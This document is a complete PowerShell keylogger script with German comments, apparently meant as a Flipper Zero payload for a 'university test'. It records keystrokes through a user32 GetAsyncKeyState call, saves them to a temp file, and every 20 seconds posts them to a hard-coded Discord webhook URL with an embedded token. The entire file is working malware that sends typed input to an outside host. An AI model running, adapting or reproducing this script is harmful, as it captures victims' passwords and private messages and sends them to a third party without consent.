# PowerShell Keylogger & Discord-Webhook-Sender mit Timeout (z.B. für Uni-Test)
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class Keyboard
{
    [DllImport("user32.dll")]
    public static extern short GetAsyncKeyState(int vKey);
}
"@

$logFile = "$env:TEMP\key.log"
$hookUrl = "https://discord.com/api/webhooks/1433072215401824358/f95HWyiUinYpyysS0MA7NUuSPFs1Ute71SLQ0hEYYvebxsCoQam850qtTGwHRDbR2yg3"

# Zeitmessung beginnen
$start = Get-Date
$timeout = 120 # Sekunden
$debugLogContent = "[INFO] Skript gestartet: $(Get-Date -Format o)"

Add-Type -AssemblyName PresentationFramework
[System.Windows.MessageBox]::Show("Keylogger-Skript wurde gestartet!", "Flipper Logger", 'OK', 'Info')
Start-Sleep -Seconds 5

while ($true) {
    # Laufzeit prüfen
    $elapsed = (Get-Date) - $start
    if ($elapsed.TotalSeconds -ge $timeout) {
        $debugLogContent += "`n[INFO] Timeout erreicht: $(Get-Date -Format o)"
        break
    }
    # 1. Tastatureingaben aufzeichnen
    foreach ($char in 32..126) {
        if ([Keyboard]::GetAsyncKeyState($char) -eq -32767) {
            Add-Content -Path $logFile -Value ([char]$char)
            $debugLogContent += "`n[DEBUG] Taste erkannt: $([char]$char) - $(Get-Date -Format o)"
        }
    }
    # 2. Alle X Sekunden Log und Debug an Discord schicken
    if ((Get-Date).Second % 20 -eq 0) {  # Alle 20 Sekunden
        $discordMsg = ""
        if (Test-Path $logFile) {
            $keylog = Get-Content $logFile -Raw
            if ($keylog.Trim().Length -gt 0) {
                $discordMsg += "[Keylog]`n$keylog`n"
                $debugLogContent += "`n[INFO] Keylog an Discord gesendet: $(Get-Date -Format o)"
                Clear-Content $logFile  # Nach dem Senden leeren
            }
        }
        if ($debugLogContent.Trim().Length -gt 0) {
            $discordMsg += "[Debug]`n$debugLogContent"
            $debugLogContent = ""  # Nach dem Senden leeren
        }
        if ($discordMsg.Trim().Length -gt 0) {
            try {
                Invoke-RestMethod -Uri $hookUrl -Method Post -Body (@{content=$discordMsg}|ConvertTo-Json) -ContentType "application/json"
            } catch {
                $debugLogContent += "`n[ERROR] Fehler beim Senden an Discord: $_ - $(Get-Date -Format o)"
            }
        }
        Start-Sleep -Seconds 1
    } else {
        Start-Sleep -Milliseconds 40
    }
}
# Nach Timeout evtl. noch ein letztes Mal den Log und Debug senden
$discordMsg = ""
if (Test-Path $logFile) {
    $keylog = Get-Content $logFile -Raw
    if ($keylog.Trim().Length -gt 0) {
        $discordMsg += "[Keylog]`n$keylog`n"
        $debugLogContent += "`n[INFO] Letzter Keylog an Discord gesendet: $(Get-Date -Format o)"
        Clear-Content $logFile
    }
}
if ($debugLogContent.Trim().Length -gt 0) {
    $discordMsg += "[Debug]`n$debugLogContent"
}
if ($discordMsg.Trim().Length -gt 0) {
    try {
        Invoke-RestMethod -Uri $hookUrl -Method Post -Body (@{content=$discordMsg}|ConvertTo-Json) -ContentType "application/json"
    } catch {
        # Fehler kann nicht mehr gemeldet werden
    }
}
